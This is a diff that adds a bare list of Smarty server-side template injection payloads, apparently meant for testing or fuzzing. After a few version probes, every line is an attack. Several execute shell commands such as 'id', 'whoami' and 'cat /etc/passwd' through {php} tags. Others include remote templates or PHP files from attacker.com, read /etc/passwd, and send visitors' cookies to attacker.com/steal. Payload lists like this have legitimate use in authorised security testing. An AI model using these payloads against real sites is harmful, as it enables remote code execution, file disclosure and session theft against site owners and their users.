@@ -1,0 +1,16 @@
+{$smarty.version}
+{$smarty.now}
+{$smarty.template}
+{$smarty.const.DIRECTORY_SEPARATOR}
+{$smarty.const.PHP_VERSION}
+{php}echo system('id');{/php}
+{php}echo system('cat /etc/passwd');{/php}
+{literal}{/literal}
+{include file="http://attacker.com/shell.tpl"}
+{include_php file="/etc/passwd"}
+{include_php file="http://attacker.com/shell.php"}
+{php}passthru('id');{/php}
+{php}passthru('whoami');{/php}
+{php}$cmd = 'id'; system($cmd);{/php}
+{php}$output = shell_exec('id'); echo $output;{/php}
+{php}file_get_contents('http://attacker.com/steal?cookie=' . urlencode($_SERVER['HTTP_COOKIE']));{/php}
